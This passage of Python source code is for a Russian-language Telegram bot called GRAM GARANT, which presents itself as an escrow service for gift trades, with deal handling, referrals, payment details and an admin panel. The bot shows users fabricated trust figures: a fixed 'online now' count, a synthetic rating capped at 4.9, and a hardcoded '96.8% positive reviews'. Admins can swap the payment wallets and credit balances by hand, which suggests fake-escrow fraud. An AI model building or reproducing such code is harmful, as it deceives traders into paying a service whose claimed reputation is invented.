        text += "👤 Продавец: @" + data.get("seller_username", "Нет") + "\n"
        text += "👤 Покупатель: @" + data.get("buyer_username", "Нет") + "\n"
        text += "📌 Статус: " + data.get("status", "") + "\n\n"
    
    text += "⬇️ *Введите ID сделки для подтверждения получения подарка:*"
    
    msg = bot.send_message(
        message.chat.id,
        text,
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, admin_confirm_gift_received)

def admin_confirm_gift_received(message):
    order_id = message.text.strip()
    
    if order_id not in orders:
        bot.send_message(message.chat.id, "❌ Сделка не найдена!")
        return
    
    order = orders[order_id]
    
    if order["status"] != "✅ Оплачено, ожидает передачи подарка":
        bot.send_message(message.chat.id, "❌ Статус сделки: " + order["status"] + "\nОжидается: ✅ Оплачено, ожидает передачи подарка")
        return
    
    order["status"] = "✅ Выполнена"
    
    if not order.get("counted", False):
        stats["success_deals"] = stats.get("success_deals", 0) + 1
        order["counted"] = True
        stats["rating"] = round(4.0 + (stats["success_deals"] / stats["total_deals"]) * 0.9, 1)
        if stats["rating"] > 4.9:
            stats["rating"] = 4.9
    
    save_orders()
    save_stats()
    
    seller_id = order.get("seller_id")
    if seller_id and seller_id in users:
        users[seller_id]["deals"]["success"] = users[seller_id]["deals"].get("success", 0) + 1
        save_users()
    
    symbol = order.get("currency_symbol", "")
    amount = order.get("amount", 0)
    buyer_username = order.get("buyer_username", "Нет")
    seller_username = order.get("seller_username", "Нет")
    description = order.get("description", "")
    
    bot.send_message(
        message.chat.id,
        "✅ *Подарок получен! Сделка " + order_id + " выполнена!*\n\n"
        "💰 Сумма: " + str(amount) + symbol + "\n"
        "👤 Продавец: @" + seller_username + "\n"
        "👤 Покупатель: @" + buyer_username + "\n\n"
        "📊 Средства зачислены продавцу.",
        parse_mode="Markdown"
    )
    
    try:
        bot.send_message(
            int(order["buyer_id"]),
            "✅ *Сделка " + order_id + " выполнена!*\n\n"
            "💰 Сумма: " + str(amount) + symbol + "\n"
            "📝 Описание: " + description + "\n\n"
            "🎉 Подарок получен! Сделка успешно завершена!\n"
            "📞 Поддержка: @" + MANAGER_USERNAME,
            parse_mode="Markdown"
        )
    except:
        pass
    
    try:
        bot.send_message(
            int(order["seller_id"]),
            "✅ *Сделка " + order_id + " выполнена!*\n\n"
            "💰 Сумма: " + str(amount) + symbol + "\n"
            "📝 Описание: " + description + "\n\n"
            "🎉 Подарок получен! Средства зачислены на ваш баланс.\n"
            "📞 Поддержка: @" + MANAGER_USERNAME,
            parse_mode="Markdown"
        )
    except:
        pass

# ========== ОТМЕНА СДЕЛКИ ==========
@bot.callback_query_handler(func=lambda call: call.data.startswith("cancel_"))
def cancel_deal(call):
    if is_banned(call.from_user.id):
        bot.answer_callback_query(call.id, "🚫 Доступ заблокирован!")
        return
    
    order_id = call.data.replace("cancel_", "")
    
    if order_id not in orders:
        bot.answer_callback_query(call.id, "❌ Сделка не найдена!")
        return
    
    order = orders[order_id]
    
    if order["status"] in ["✅ Выполнена", "✅ Оплачено, ожидает передачи подарка"]:
        bot.answer_callback_query(call.id, "❌ Нельзя отменить выполненную сделку!")
        return
    
    if str(call.from_user.id) not in [order.get("buyer_id"), order.get("seller_id")]:
        bot.answer_callback_query(call.id, "❌ Вы не являетесь участником этой сделки!")
        return
    
    order["status"] = "❌ Отменена"
    save_orders()
    
    try:
        bot.edit_message_text(
            "❌ *Сделка " + order_id + " отменена*",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="Markdown"
        )
    except:
        bot.send_message(
            call.message.chat.id,
            "❌ *Сделка " + order_id + " отменена*",
            parse_mode="Markdown"
        )
    
    bot.answer_callback_query(call.id, "✅ Сделка отменена")

# ========== МОИ СДЕЛКИ ==========
@bot.message_handler(func=lambda m: m.text == "📋 Мои сделки")
def my_orders(message):
    if is_banned(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Вы заблокированы!")
        return
    
    user_id = str(message.from_user.id)
    user_orders = {k: v for k, v in orders.items() if v.get("buyer_id") == user_id or v.get("seller_id") == user_id}
    
    if not user_orders:
        bot.send_message(
            message.chat.id,
            "📭 *У вас пока нет сделок*\n\nСоздайте свою первую сделку!",
            parse_mode="Markdown",
            reply_markup=main_menu()
        )
        return
    
    text = "📋 *Мои сделки*\nСтраница 1 из 1 | Всего сделок: " + str(len(user_orders)) + "\n\n"
    
    for order_id, data in list(user_orders.items())[-5:]:
        status_emoji = {
            "⏳ Ожидает покупателя": "🟡",
            "⏳ Ожидает оплаты": "🟠",
            "✅ Оплачено, ожидает передачи подарка": "🔵",
            "✅ Выполнена": "🟢",
            "❌ Отменена": "🔴"
        }.get(data.get("status", ""), "⚪")
        
        symbol = data.get("currency_symbol", "")
        amount = data.get("amount", 0)
        
        text += status_emoji + " *Сделка " + order_id + "*\n"
        text += "📅 Дата: " + data.get("date", "") + "\n"
        if data.get("buyer_id") == user_id:
            text += "👤 Продавец: @" + data.get("seller_username", "Нет") + "\n"
        else:
            text += "👤 Покупатель: @" + (data.get("buyer_username", "Нет") or "Ожидается") + "\n"
        text += "💰 Сумма: " + str(amount) + symbol + "\n"
        text += "📌 Статус: " + data.get("status", "") + "\n\n"
    
    bot.send_message(
        message.chat.id,
        text,
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

# ========== РЕФЕРАЛЫ ==========
@bot.message_handler(func=lambda m: m.text == "👥 Рефералы")
def referrals(message):
    if is_banned(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Вы заблокированы!")
        return
    
    user_id = str(message.from_user.id)
    user_data = users.get(user_id, {})
    
    ref_code = user_data.get("referral_code", "")
    bot_username = bot.get_me().username
    referrals_list = user_data.get("referrals", [])
    
    active_referrals = [r for r in referrals_list if users.get(r, {}).get("deals", {}).get("total", 0) > 0]
    
    text = (
        "👥 *Реферальная система*\n\n"
        "🔗 *Ваша реферальная ссылка:*\n`https://t.me/" + bot_username + "?start=" + ref_code + "`\n\n"
        "📊 *Статистика рефералов:*\n"
        "• Всего приглашено: " + str(len(referrals_list)) + "\n"
        "• Активных рефералов: " + str(len(active_referrals)) + "\n\n"
        "💰 *Ваши бонусы:*\n"
        "• За каждого активного реферала: +50 STARS\n"
        "• Текущий баланс STARS: " + str(user_data.get("balance", {}).get("stars", 0))
    )
    
    bot.send_message(
        message.chat.id,
        text,
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

# ========== ПОДРОБНЕЕ ==========
@bot.message_handler(func=lambda m: m.text == "📊 Подробнее")
def details(message):
    if is_banned(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Вы заблокированы!")
        return
    
    success_rate = int(stats.get("success_deals", 0) / stats.get("total_deals", 1) * 100) if stats.get("total_deals", 0) > 0 else 0
    
    text = (
        "📊 *Статистика GRAM GARANT*\n\n"
        "🤝 Всего сделок: " + str(stats.get("total_deals", 0)) + "\n"
        "✅ Успешных сделок: " + str(stats.get("success_deals", 0)) + " (" + str(success_rate) + "%)\n"
        "💰 Общий объём сделок: $" + str(stats.get("volume", 0)) + "\n"
        "⭐️ Средний рейтинг: " + str(stats.get("rating", 4.6)) + "/5.0\n"
        "🟢 Онлайн сейчас: " + str(stats.get("online", 26)) + "\n\n"
        "📈 *Наши преимущества:*\n\n"
        "• 🔒 Гарант-сервис на все сделки\n"
        "• ⚡️ Мгновенная доставка товаров\n"
        "• 🛡️ Защита от мошенников\n"
        "• 💎 Проверенные продавцы\n"
        "• 📞 24/7 Поддержка\n"
        "• ⭐️ 96.8% положительных отзывов\n\n"
        "📞 *Поддержка:* @" + MANAGER_USERNAME
    )
    
    bot.send_message(
        message.chat.id,
        text,
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

# ========== РЕКВИЗИТЫ ==========
@bot.message_handler(func=lambda m: m.text == "💳 Реквизиты")
def requisites(message):
    if is_banned(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Вы заблокированы!")
        return
    
    text = (
        "💳 *Реквизиты для оплаты*\n\n"
        "🪙 *TON:*\n`" + settings.get("ton_wallet", "Не установлен") + "`\n\n"
        "💳 *Карта (RUB):*\n`" + settings.get("card_rub", "Не установлен") + "`\n\n"
        "💳 *Карта (USD):*\n`" + settings.get("card_usd", "Не установлен") + "`\n\n"
        "⭐️ *Stars:*\n" + settings.get("stars_username", "@GrumGuardManager") + "\n\n"
        "🇨🇳 *CNY:*\n`" + settings.get("cny_wallet", "Не установлен") + "`\n\n"
        "🇹🇭 *THB:*\n`" + settings.get("thb_wallet", "Не установлен") + "`\n\n"
        "💎 *USDT (TRC20):*\n`" + settings.get("usdt_wallet", "Не установлен") + "`\n\n"
        "⚠️ *Важно:* Указывайте комментарий к платежу!\n"
        "📞 По вопросам: @" + MANAGER_USERNAME
    )
    
    bot.send_message(
        message.chat.id,
        text,
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

# ========== ЯЗЫК ==========
@bot.message_handler(func=lambda m: m.text == "🌐 Язык")
def language_settings(message):
    if is_banned(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 Вы заблокированы!")
        return
    
    bot.send_message(
        message.chat.id,
        "🌐 *Выберите язык / Choose language:*",
        parse_mode="Markdown",
        reply_markup=language_menu()
    )

@bot.message_handler(func=lambda m: m.text in ["🇷🇺 Русский", "🇬🇧 English", "🇨🇳 中文", "🇸🇦 العربية"])
def set_language(message):
    user_id = str(message.from_user.id)
    
    if user_id in users:
        users[user_id]["language"] = message.text
        save_users()
    
    bot.send_message(
        message.chat.id,
        "✅ Язык изменён на " + message.text,
        reply_markup=main_menu()
    )

# ========== НАЗАД В МЕНЮ ==========
@bot.message_handler(func=lambda m: m.text == "🔙 Вернуться в меню")
def back_to_menu(message):
    if is_admin(message.from_user.id):
        bot.send_message(
            message.chat.id,
            "🔙 Возврат в меню",
            reply_markup=admin_menu()
        )
    else:
        bot.send_message(
            message.chat.id,
            "🔙 Возврат в меню",
            reply_markup=main_menu()
        )

@bot.callback_query_handler(func=lambda call: call.data == "back_to_menu")
def back_to_menu_callback(call):
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except:
        pass
    
    bot.send_message(
        call.message.chat.id,
        "Выберите действие:",
        reply_markup=main_menu()
    )
    bot.answer_callback_query(call.id)

# ========== АДМИН-ПАНЕЛЬ ==========
@bot.message_handler(func=lambda m: m.text == "⬅️ Выйти" and is_admin(m.from_user.id))
def admin_exit(message):
    bot.send_message(
        message.chat.id,
        "⬅️ Выход из админ-панели",
        reply_markup=main_menu()
    )

@bot.message_handler(func=lambda m: m.text == "🔧 Настройки" and is_admin(m.from_user.id))
def admin_settings(message):
    bot.send_message(
        message.chat.id,
        "🔧 *Настройки реквизитов*\n\nВыберите что хотите изменить:",
        parse_mode="Markdown",
        reply_markup=settings_menu()
    )

@bot.message_handler(func=lambda m: m.text in [
    "🪙 Изменить TON", 
    "💳 Изменить карту (RUB)", 
    "💳 Изменить карту (USD)", 
    "⭐️ Изменить Stars юзернейм", 
    "🇨🇳 Изменить CNY", 
    "🇹🇭 Изменить THB", 
    "💎 Изменить USDT"
] and is_admin(m.from_user.id))
def change_setting(message):
    setting_map = {
        "🪙 Изменить TON": "ton_wallet",
        "💳 Изменить карту (RUB)": "card_rub",
        "💳 Изменить карту (USD)": "card_usd",
        "⭐️ Изменить Stars юзернейм": "stars_username",
        "🇨🇳 Изменить CNY": "cny_wallet",
        "🇹🇭 Изменить THB": "thb_wallet",
        "💎 Изменить USDT": "usdt_wallet"
    }
    
    setting = setting_map.get(message.text)
    msg = bot.send_message(
        message.chat.id,
        "Введите новое значение для " + message.text + ":"
    )
    bot.register_next_step_handler(msg, lambda m: save_setting(m, setting, message.text))

def save_setting(message, setting, setting_name):
    if setting in settings:
        settings[setting] = message.text.strip()
        save_settings()
        bot.send_message(
            message.chat.id,
            "✅ " + setting_name + " успешно обновлён!",
            reply_markup=settings_menu()
        )

@bot.message_handler(func=lambda m: m.text == "👥 Пользователи" and is_admin(m.from_user.id))
def admin_users(message):
    if not users:
        bot.send_message(message.chat.id, "📭 Нет зарегистрированных пользователей.")
        return
    
    text = "👥 *Все пользователи:*\n\n"
    for user_id, data in list(users.items())[-20:]:
        status = "🚫 Заблокирован" if data.get("is_banned", False) else "✅ Активен"
        text += "🆔 `" + user_id + "`\n"
        text += "👤 " + data.get("first_name", "Нет") + " (@" + data.get("username", "Нет") + ")\n"
        text += "⭐️ STARS: " + str(data.get("balance", {}).get("stars", 0)) + "\n"
        text += "₽ RUB: " + str(data.get("balance", {}).get("rub", 0)) + "\n"
        text += "📊 Сделок: " + str(data.get("deals", {}).get("total", 0)) + "\n"
        text += "📌 " + status + "\n\n"
    
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📊 Полная статистика", callback_data="admin_full_stats"))
    
    bot.send_message(
        message.chat.id, 
        text, 
        parse_mode="Markdown",
        reply_markup=kb
    )

@bot.callback_query_handler(func=lambda call: call.data == "admin_full_stats")
def admin_full_stats(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Доступ запрещён!")
        return
    
    total_users = len(users)
    total_orders = len(orders)
    banned_users = len(blacklist)
    
    total_stars = sum(u.get("balance", {}).get("stars", 0) for u in users.values())
    total_rub = sum(u.get("balance", {}).get("rub", 0) for u in users.values())
    total_usdt = sum(u.get("balance", {}).get("usdt", 0) for u in users.values())
    
    success_rate = int(stats.get("success_deals", 0) / stats.get("total_deals", 1) * 100) if stats.get("total_deals", 0) > 0 else 0
    
    text = (
        "📊 *Полная статистика*\n\n"
        "👥 *Пользователи:*\n"
        "Всего: " + str(total_users) + "\n"
        "🚫 Заблокировано: " + str(banned_users) + "\n"
        "✅ Активных: " + str(total_users - banned_users) + "\n"
        "🟢 Онлайн: " + str(stats.get("online", 26)) + "\n\n"
        "💰 *Балансы:*\n"
        "⭐️ STARS: " + str(total_stars) + "\n"
        "₽ RUB: " + str(total_rub) + "\n"
        "$ USDT: " + str(total_usdt) + "\n\n"
        "📋 *Сделки:*\n"
        "Всего: " + str(total_orders) + "\n"
        "Успешных: " + str(stats.get("success_deals", 0)) + " (" + str(success_rate) + "%)\n"
        "Объём: $" + str(stats.get("volume", 0)) + "\n"
        "Рейтинг: " + str(stats.get("rating", 4.6)) + "/5.0\n"
        "В ожидании: " + str(len([o for o in orders.values() if o.get("status") == "⏳ Ожидает оплаты"])) + "\n"
        "На передаче: " + str(len([o for o in orders.values() if o.get("status") == "✅ Оплачено, ожидает передачи подарка"])) + "\n"
        "Отменено: " + str(len([o for o in orders.values() if o.get("status") == "❌ Отменена"])) + "\n\n"
        "👥 Рефералов: " + str(stats.get("total_referrals", 0))
    )
    
    bot.edit_message_text(
        text,
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode="Markdown"
    )
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: m.text == "📋 Все сделки" and is_admin(m.from_user.id))
def admin_orders(message):
    if not orders:
        bot.send_message(message.chat.id, "📭 Нет ни одной сделки.")
        return
    
    text = "📋 *Все сделки:*\n\n"
    for order_id, data in list(orders.items())[-10:]:
        status_emoji = {
            "⏳ Ожидает покупателя": "🟡",
            "⏳ Ожидает оплаты": "🟠",
            "✅ Оплачено, ожидает передачи подарка": "🔵",
            "✅ Выполнена": "🟢",
            "❌ Отменена": "🔴"
        }.get(data.get("status", ""), "⚪")
        
        symbol = data.get("currency_symbol", "")
        amount = data.get("amount", 0)
        
        text += status_emoji + " #" + order_id + " | " + str(amount) + symbol + "\n"
        text += "👤 Продавец: @" + data.get("seller_username", "Нет") + "\n"
        text += "👤 Покупатель: @" + (data.get("buyer_username", "Нет") or "Ожидается") + "\n"
        text += "📌 " + data.get("status", "") + "\n\n"
    
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "💰 Выдать средства" and is_admin(m.from_user.id))
def admin_give(message):
    msg = bot.send_message(
        message.chat.id,
        "💰 *Выдача средств*\n\nВведите ID пользователя, валюту и сумму через пробел:\nПример: `7742192854 stars 1000`\nВалюты: stars, rub, usdt, ton, cny, thb"
    )
    bot.register_next_step_handler(msg, admin_give_step)

def admin_give_step(message):
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.send_message(message.chat.id, "❌ Неверный формат! Используйте: `ID ВАЛЮТА СУММА`")
            return
        
        user_id = parts[0]
        currency = parts[1].lower()
        amount = float(parts[2])
        
        if user_id not in users:
            bot.send_message(message.chat.id, "❌ Пользователь " + user_id + " не найден!")
            return
        
        if currency not in ["stars", "rub", "usdt", "ton", "cny", "thb"]:
            bot.send_message(message.chat.id, "❌ Неверная валюта! Доступны: stars, rub, usdt, ton, cny, thb")
            return
        
        if amount <= 0:
            bot.send_message(message.chat.id, "❌ Сумма должна быть больше 0!")
            return
        
        if add_balance(user_id, currency, amount):
            bot.send_message(
                message.chat.id,
                "✅ Выдано " + str(amount) + " " + currency.upper() + " пользователю `" + user_id + "`",
                parse_mode="Markdown"
            )
            
            try:
                bot.send_message(
                    int(user_id),
                    "💰 *Вам начислено " + str(amount) + " " + currency.upper() + "!*",
                    parse_mode="Markdown"
                )
            except:
                pass
        else:
            bot.send_message(message.chat.id, "❌ Ошибка при выдаче средств!")
            
    except ValueError:
        bot.send_message(message.chat.id, "❌ Сумма должна быть числом!")
    except Exception as e:
        bot.send_message(message.chat.id, "❌ Ошибка: " + str(e))

@bot.message_handler(func=lambda m: m.text == "📢 Рассылка" and is_admin(m.from_user.id))
def admin_broadcast(message):
    msg = bot.send_message(
        message.chat.id,
        "📢 *Рассылка*\n\nВведите текст рассылки (можно с Markdown):"
    )
    bot.register_next_step_handler(msg, admin_broadcast_step)

def admin_broadcast_step(message):
    text = message.text
    sent = 0
    failed = 0
    
    bot.send_message(message.chat.id, "⏳ Отправка рассылки...")
    
    for user_id in users.keys():
        try:
            bot.send_message(
                int(user_id),
                "📢 *Рассылка от GRAM GARANT*\n\n" + text + "\n\n📞 Поддержка: @" + MANAGER_USERNAME,
                parse_mode="Markdown"
            )
            sent += 1
            time.sleep(0.05)
        except:
            failed += 1
    
    bot.send_message(
        message.chat.id,
        "✅ *Рассылка завершена!*\n\n📨 Отправлено: " + str(sent) + "\n❌ Не доставлено: " + str(failed) + "\n👥 Всего пользователей: " + str(len(users))
    )

@bot.message_handler(func=lambda m: m.text == "🚫 Чёрный список" and is_admin(m.from_user.id))
def admin_blacklist(message):
    if not blacklist:
        bot.send_message(message.chat.id, "📭 Чёрный список пуст.")
        return
    
    text = "🚫 *Чёрный список:*\n\n"
    for user_id in blacklist:
        user_data = users.get(user_id, {})
        text += "🆔 `" + user_id + "`\n"
        text += "👤 " + user_data.get("first_name", "Неизвестно") + "\n"
        text += "📅 Дата регистрации: " + user_data.get("reg_date", "Нет") + "\n\n"
    
    kb = types.InlineKeyboardMarkup()
    kb.add(
        types.InlineKeyboardButton("➕ Добавить в ЧС", callback_data="admin_add_blacklist"),
        types.InlineKeyboardButton("➖ Удалить из ЧС", callback_data="admin_remove_blacklist")
    )
    
    bot.send_message(
        message.chat.id,
        text,
        parse_mode="Markdown",
        reply_markup=kb
    )

@bot.callback_query_handler(func=lambda call: call.data == "admin_add_blacklist")
def admin_add_blacklist(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Доступ запрещён!")
        return
    
    msg = bot.send_message(
        call.message.chat.id,
        "Введите ID пользователя для добавления в чёрный список:"
    )
    bot.register_next_step_handler(msg, admin_add_blacklist_step)
    bot.answer_callback_query(call.id)

def admin_add_blacklist_step(message):
    user_id = message.text.strip()
    
    if user_id not in users:
        bot.send_message(message.chat.id, "❌ Пользователь " + user_id + " не найден!")
        return
    
    if user_id in blacklist:
        bot.send_message(message.chat.id, "⚠️ Пользователь " + user_id + " уже в чёрном списке!")
        return
    
    blacklist.append(user_id)
    users[user_id]["is_banned"] = True
    save_blacklist()
    save_users()
    
    bot.send_message(
        message.chat.id,
        "✅ Пользователь `" + user_id + "` добавлен в чёрный список!",
        parse_mode="Markdown"
    )
    
    try:
        bot.send_message(
            int(user_id),
            "🚫 *Вы были заблокированы в боте!*\n\nДля разблокировки обратитесь к @" + MANAGER_USERNAME,
            parse_mode="Markdown"
        )
    except:
        pass

@bot.callback_query_handler(func=lambda call: call.data == "admin_remove_blacklist")
def admin_remove_blacklist(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Доступ запрещён!")
        return
    
    if not blacklist:
        bot.answer_callback_query(call.id, "📭 Чёрный список пуст!")
        return
    
    text = "📋 *Пользователи в чёрном списке:*\n\n"
    for user_id in blacklist:
        user_data = users.get(user_id, {})
        text += "🆔 `" + user_id + "` - " + user_data.get("first_name", "Неизвестно") + "\n"
    
    text += "\nВведите ID пользователя для удаления из чёрного списка:"
    
    msg = bot.send_message(
        call.message.chat.id,
        text,
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, admin_remove_blacklist_step)
    bot.answer_callback_query(call.id)

def admin_remove_blacklist_step(message):
    user_id = message.text.strip()
    
    if user_id not in blacklist:
        bot.send_message(message.chat.id, "❌ Пользователь " + user_id + " не найден в чёрном списке!")
        return
    
    blacklist.remove(user_id)
    if user_id in users:
        users[user_id]["is_banned"] = False
    save_blacklist()
    save_users()
    
    bot.send_message(
        message.chat.id,
        "✅ Пользователь `" + user_id + "` удалён из чёрного списка!",
        parse_mode="Markdown"
    )
    
    try:
        bot.send_message(
            int(user_id),
            "✅ *Вы были разблокированы в боте!*\n\nТеперь вы снова можете пользоваться сервисом.\n📞 По вопросам: @" + MANAGER_USERNAME,
            parse_mode="Markdown"
        )
    except:
        pass

@bot.message_handler(func=lambda m: m.text == "📊 Статистика" and is_admin(m.from_user.id))
def admin_stats(message):
    total_users = len(users)
    total_orders = len(orders)
    banned_users = len(blacklist)
    
    total_stars = sum(u.get("balance", {}).get("stars", 0) for u in users.values())
    total_rub = sum(u.get("balance", {}).get("rub", 0) for u in users.values())
    total_usdt = sum(u.get("balance", {}).get("usdt", 0) for u in users.values())
    
    success_rate = int(stats.get("success_deals", 0) / stats.get("total_deals", 1) * 100) if stats.get("total_deals", 0) > 0 else 0
    
    text = (
        "📊 *Статистика бота*\n\n"
        "👥 *Пользователи:*\n"
        "Всего: " + str(total_users) + "\n"
        "🚫 Заблокировано: " + str(banned_users) + "\n"
        "✅ Активных: " + str(total_users - banned_users) + "\n"
        "🟢 Онлайн: " + str(stats.get("online", 26)) + "\n\n"
        "💰 *Балансы:*\n"
        "⭐️ STARS: " + str(total_stars) + "\n"
        "₽ RUB: " + str(total_rub) + "\n"
        "$ USDT: " + str(total_usdt) + "\n\n"
        "📋 *Сделки:*\n"
        "🤝 Всего: " + str(stats.get("total_deals", 0)) + "\n"
        "✅ Успешных: " + str(stats.get("success_deals", 0)) + " (" + str(success_rate) + "%)\n"
        "💰 Объём: $" + str(stats.get("volume", 0)) + "\n"
        "⭐️ Рейтинг: " + str(stats.get("rating", 4.6)) + "/5.0\n"
        "В ожидании: " + str(len([o for o in orders.values() if o.get("status") == "⏳ Ожидает оплаты"])) + "\n"
        "На передаче: " + str(len([o for o in orders.values() if o.get("status") == "✅ Оплачено, ожидает передачи подарка"])) + "\n"
        "Отменено: " + str(len([o for o in orders.values() if o.get("status") == "❌ Отменена"])) + "\n\n"
        "👥 Рефералов: " + str(stats.get("total_referrals", 0))
    )
    
    bot.send_message(
        message.chat.id,
        text,
        parse_mode="Markdown"
    )

# ========== ЗАПУСК ==========
if __name__ == "__main__":
    print("🏦 GRAM GARANT запущен!")
    print("👥 Админы: " + str(ADMIN_IDS))
    print("👤 Менеджер: @" + MANAGER_USERNAME)
    print("👤 Пользователей: " + str(len(users)))
    print("📋 Сделок: " + str(len(orders)))
    print("🟢 Онлайн: " + str(stats.get("online", 26)))
    print("📊 Всего сделок: " + str(stats.get("total_deals", 438)))
    print("✅ Успешных: " + str(stats.get("success_deals", 412)))
    print("💰 Объём: $" + str(stats.get("volume", 249)))
    print("⭐️ Рейтинг: " + str(stats.get("rating", 4.6)) + "/5.0")
    
    try:
        bot.infinity_polling()
    except Exception as e:
        print("❌ Ошибка: " + str(e))